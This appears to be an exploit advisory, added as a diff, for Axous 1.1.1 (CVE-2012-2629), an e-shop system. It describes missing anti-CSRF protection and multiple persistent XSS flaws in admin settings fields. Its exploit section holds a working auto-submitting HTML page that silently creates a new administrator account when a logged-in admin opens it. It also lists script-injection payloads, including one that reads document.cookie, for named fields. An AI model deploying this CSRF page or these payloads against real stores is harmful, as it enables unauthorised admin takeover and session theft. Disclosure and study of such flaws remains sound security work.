@@ -1,0 +1,103 @@
++-----------------------------------------------------------------------------------------------------------+
+# Exploit Title     : Axous 1.1.1 Multiple Vulnerabilities (CSRF - Persistent XSS) 
+# Date              : 30-04-2012
+# Author            : Ivano Binetti (http://www.ivanobinetti.com)
+# Software link     : http://www.axous.com/get.php?pid=1
+# Vendor site       : http://www.axous.com/
+# Version           : 1.1.1 (and lower)
+# Tested on         : Debian Squeeze (6.0) 
+# CVE               : CVE-2012-2629
+# Original Advisory : http://www.webapp-security.com/2012/05/axous-1-1-1-multiple-vulnerabilities-csrf-persistent-xss/
++-----------------------------------------------------------------------------------------------------------+
+
+Summary
+
+1)Introduction
+2)Vulnerabilities Description 
+ 2.1 CSRF 
+ 2.2 Persistent XSS
+3)Exploit
+ 3.1 Exploit  CSRF (Add admin)
+ 3.2 Exploit Persistent XSS
+  3.2.1 Exploit "page_title"
+  3.2.2 Exploit "category_name[1]"
+  3.2.3 Exploit "site_name", "seo_title" and "meta_keywords"
+  3.2.4 Exploit "company_name", "address1", "address2", "city", "state", "country", "author_first_name", "author_last_name", "author_email", etc
+  3.2.5 Exploit "system_email", "sender_name", "smtp_server", "smtp_username", "smtp_password", "order_notice_email"
++-----------------------------------------------------------------------------------------------------------+
+1)Introduction
+Axous "is an e-shop system for software venders. With Axous, you can setup a professional software site, start selling your product with PayPal 
+ExpressCheckout, and send regcode to your customers automaticly in 5 minutes". 
+
+2)Vulnerability Description 
+ 2.1 CSRF
+ Axous 1.1.1 (And below) suffers from multiple CSRF vulnerabilities which could allow an attacker to change any parameters when an authenticated 
+ user/admin browses a special crafted web page. 
+ In this Advisory I will only demonstrate how to add a new administrator but, with little modifications to my exploit, you can modify any Axous's 
+ parameters, as Axous does not use an anti-CSRF token.
+ 
+ 2.2 Persistent XSS 
+ Axous 1.1.1 (and below) is prone to multiple persistent XSS vulnerabilities due to an improper input sanitization of the following parameters: 
+ - "page_title" passed to server side logic (path: "admin/content_pages_edit.php") via http POST method.
+ Exploiting "page_title" parameter an authenticated administrator could insert arbitrary code in "Title" field, and execute it 
+ when another administrator clicks on "Pages" link or on that specific pages under "Title" menu.
+ Furthermore injected code will generate a persistent XSS for all unauthenticated users visiting that web page.
+
+ - "category_name[1]" passed to server side logic (path:"admin/products_category.php") via http POST method.
+ Exploiting "category_name[1]" parameter an administrator could insert arbitrary code in "Category" field (under "Control Panel > Products")
+ and create a persistent XSS for another administrator who clicks on the "Add New" button (always under "Control Panel > Products").
+
+ -"site_name", "seo_title" and "meta_keywords" parameters passed to "admin/settings_siteinfo.php" script via http POST method.
+ Exploiting these parameters an authenticated administrator could insert arbitrary code and create a persistent XSS for another administrator 
+ who clicks "Site info" link under Settings menu.
+ 
+ - "company_name", "address1", "address2", "city", "state", "country", "author_first_name", "author_last_name", "author_email", "contact_first_name", 
+ "contact_last_name", "contact_email", "general_email", "general_phone", "general_fax", "sales_email", "sales_phone", "support_email", "support_phone" 
+ passed to "admin/settings_company.php" script via http POST method.
+ Exploiting these parameters an authenticated administrator could insert arbitrary code and create a persistent XSS for another administrator 
+ who visits that injected menu.
+
+ - "system_email", "sender_name", "smtp_server", "smtp_username", "smtp_password", "order_notice_email" parameters passed to 
+ "admin/settings_email.php" via httl POSt method.
+ Exploiting these parameters an authenticated administrator could insert arbitrary code and create a persistent XSS for another administrator 
+ who clicks "Site info" link under Settings menu.
+
+ Other parameters could be injected!
+ 
+ 
+3)Exploit 
+ 3.1 Exploit CSRF (Add admin)
+ <html>  
+ <body onload="javascript:document.forms[0].submit()">
+ <form method="POST" name="form0" action="http://<ip_address>:80/admin/administrators_add.php">
+ <input type="hidden" name="user_name" value="newadmin"/>
+ <input type="hidden" name="new_passwd" value="newpassword"/>
+ <input type="hidden" name="new_passwd1" value="newpassword"/>
+ <input type="hidden" name="email" value="newemail@email.com"/>
+ <input type="hidden" name="dosubmit" value="1"/>
+ <input type="hidden" name="id" value=""/>
+ <input type="hidden" name="action" value="addnew"/>
+ </form>
+ </body>
+ </html> 
+
+ 3.2 Exploit Persistent XSS
+  3.2.1 Exploit "page_title" 
+  Insert the following code in "Title" field under "Edit page" section:
+  Page_Title<script>alert(document.cookie)</script>  
+  
+  3.2.2 Exploit "category_name[1]" 
+  Insert the following code in "Category" field under "Control Panel > Products" section:  <script>alert(document.cookie)</script>
+
+  3.2.3 Exploit "site_name", "seo_title" and "meta_keywords" 
+  Insert the following code in "Site name" filed under "Control Panel > Settings":
+  "/><script>alert("XSS")</script>
+
+  3.2.4 Exploit "company_name", "address1", "address2", "city", "state", "country", "author_first_name", "author_last_name", "author_email", etc
+  Insert the following code in all fields under "Control Panel > Settings > Company info":
+  "/><script>alert("XSS")</script>
+
+  3.2.5 Exploit "system_email", "sender_name", "smtp_server", "smtp_username", "smtp_password", "order_notice_email" 
+  Insert the following code in all fields under "Control Panel > Settings > E-mail Settings":
+  "/><script>alert("XSS")</script>
++-----------------------------------------------------------------------------------------------------------+
